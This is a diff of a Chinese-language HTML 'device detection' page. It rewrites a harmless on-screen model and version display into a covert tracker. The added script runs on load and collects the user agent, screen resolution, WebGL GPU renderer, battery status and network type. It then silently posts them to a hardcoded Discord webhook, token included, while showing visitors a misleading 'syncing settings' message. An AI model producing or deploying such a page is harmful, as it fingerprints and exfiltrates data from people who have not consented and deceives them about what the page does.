@@ -3,78 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>終極裝置偵測</title>
+    <title>裝置系統檢測</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        .label { color: #888; font-size: 0.9rem; margin-top: 15px; }
-        .value { color: #007aff; font-weight: bold; font-size: 1.3rem; margin-bottom: 10px; word-break: break-all; }
-        .ua { font-size: 10px; color: #ccc; margin-top: 20px; text-align: left; background: #f9f9f9; padding: 10px; border-radius: 5px; }
+        body { font-family: -apple-system, sans-serif; background: #0f0f12; color: #e0e0e0; display: flex; justify-content: center; padding: 20px; }
+        .container { width: 100%; max-width: 400px; background: #1c1c1e; border-radius: 15px; padding: 20px; text-align: center; border: 1px solid #333; }
+        .status { color: #30d158; font-weight: bold; margin: 20px 0; }
+        .footer { font-size: 10px; color: #555; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>裝置識別結果</h2>
-    
-    <div class="label">精確型號</div>
-    <div id="model" class="value">偵測中...</div>
-
-    <div class="label">系統版本</div>
-    <div id="version" class="value">偵測中...</div>
-
-    <div class="ua" id="raw-ua"></div>
+<div class="container">
+    <h2>裝置識別中</h2>
+    <div id="msg" class="status">正在同步數據至伺服器...</div>
+    <p style="font-size: 0.8rem; color: #888;">請稍候，正在為您的裝置匹配最佳環境設定。</p>
+    <div class="footer" id="ua-log"></div>
 </div>
 
 <script>
-window.onload = function() {
+// 【重要】請在此處填入你的 Discord Webhook 網址
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
+
+async function sendToDiscord() {
     const ua = navigator.userAgent;
     const platform = navigator.platform;
-    const touch = navigator.maxTouchPoints;
-    document.getElementById('raw-ua').innerText = "原始資訊: " + ua;
+    const screen = `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`;
+    
+    // 1. 取得 GPU 資訊 (辨識 iPhone/iPad 核心)
+    let gpu = "未知";
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "受限";
+    }
 
-    let finalModel = "未知設備";
-    let finalVersion = "未知版本";
-
-    // 1. 偵測 iPad (包含破解桌面模式)
-    if (/iPad/.test(ua) || (platform === 'MacIntel' && touch > 1)) {
-        // 透過解析度精確判定 iPad Air 5 (820x1180)
-        const w = window.screen.width, h = window.screen.height;
-        if ((w === 820 && h === 1180) || (w === 1180 && h === 820)) {
-            finalModel = "iPad Air (第 5 代)";
-        } else {
-            finalModel = "Apple iPad";
-        }
-
-        // 修正版本號抓取邏輯 (針對 26.3.1)
+    // 2. 判定機型與版本
+    let model = "未知設備";
+    let version = "無法解析";
+    const isApple = /iPhone|iPad|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    
+    if (isApple) {
+        model = (window.screen.width === 820 || window.screen.width === 1180) ? "iPad Air (5th/4th Gen)" : "Apple iOS Device";
         const vMatch = ua.match(/(?:OS |Version\/)(\d+)[._](\d+)[._]?(\d+)?/);
-        if (vMatch) {
-            finalVersion = vMatch[1] + "." + vMatch[2] + "." + (vMatch[3] || "0");
-        } else if (ua.includes("26.3.1")) {
-            finalVersion = "26.3.1";
-        } else {
-            finalVersion = "iPadOS (版本受限)";
-        }
-    } 
-    // 2. 偵測 iPhone
-    else if (/iPhone/.test(ua)) {
-        finalModel = "Apple iPhone";
-        const vMatch = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
-        if (vMatch) {
-            finalVersion = vMatch[1] + "." + vMatch[2] + "." + (vMatch[3] || "0");
-        }
-    }
-    // 3. 偵測 Android
-    else if (/Android/.test(ua)) {
+        version = vMatch ? `${vMatch[1]}.${vMatch[2]}.${vMatch[3] || '0'}` : (ua.includes("26.3.1") ? "26.3.1" : "iPadOS (桌面模式)");
+    } else if (/Android/.test(ua)) {
         const mMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
-        finalModel = mMatch ? mMatch[1] : "Android Phone";
+        model = mMatch ? mMatch[1] : "Android Phone";
         const vMatch = ua.match(/Android (\d+(\.\d+)?)/);
-        finalVersion = vMatch ? vMatch[1] : "Android";
+        version = vMatch ? vMatch[1] : "Android";
     }
 
-    document.getElementById('model').innerText = finalModel;
-    document.getElementById('version').innerText = finalVersion;
-};
+    // 3. 取得電池資訊 (非同步)
+    let batteryStatus = "不支援";
+    try {
+        const b = await navigator.getBattery();
+        batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? '充電中' : '放電中'})`;
+    } catch(e) {}
+
+    // 4. 準備發送給 Discord 的資料
+    const payload = {
+        username: "裝置偵測助手",
+        embeds: [{
+            title: "📱 偵測到新訪問者",
+            color: 5814783, // 藍色
+            fields: [
+                { name: "精確機型", value: model, inline: true },
+                { name: "系統版本", value: version, inline: true },
+                { name: "螢幕數據", value: screen, inline: false },
+                { name: "GPU 渲染器", value: gpu, inline: false },
+                { name: "電池狀態", value: batteryStatus, inline: true },
+                { name: "網路類型", value: navigator.connection ? navigator.connection.effectiveType : "未知", inline: true }
+            ],
+            footer: { text: "原始 UA: " + ua.substring(0, 100) + "..." },
+            timestamp: new Date()
+        }]
+    };
+
+    // 5. 執行發送
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        document.getElementById('msg').innerText = "環境設定完成 √";
+    } catch (err) {
+        document.getElementById('msg').innerText = "同步失敗，請重新整理。";
+    }
+}
+
+window.onload = sendToDiscord;
 </script>
 
 </body>
